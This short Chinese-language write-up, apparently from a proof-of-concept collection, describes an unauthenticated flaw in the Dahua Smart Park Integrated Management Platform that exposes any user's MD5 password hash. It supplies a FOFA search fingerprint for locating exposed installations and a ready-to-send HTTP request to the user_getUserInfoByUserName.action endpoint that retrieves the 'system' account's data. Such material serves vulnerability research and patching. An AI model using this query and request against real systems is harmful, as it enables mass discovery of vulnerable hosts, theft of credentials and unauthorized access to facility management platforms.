##  大华智慧园区综合管理平台user_getUserInfoByUserName.action未授权任意用户密码读取

大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调 配和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管 理需求，同时通过提供智能服务，增强使用体验。

 由于该平台未对接口权限做限制，攻击者可以从 user_getUserInfoByUserName.action 接口获取任意用户密码(MD5 格式)。

## fofa

```
body="src=/WPMS/asset/common/js/jsencrypt.min.js"
```

## poc

```
GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
Host: xxxxxxxxx
Cookie: JSESSIONID=D99F6DAEA7EC0695266E95A1B1A529CC
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405262009978.png)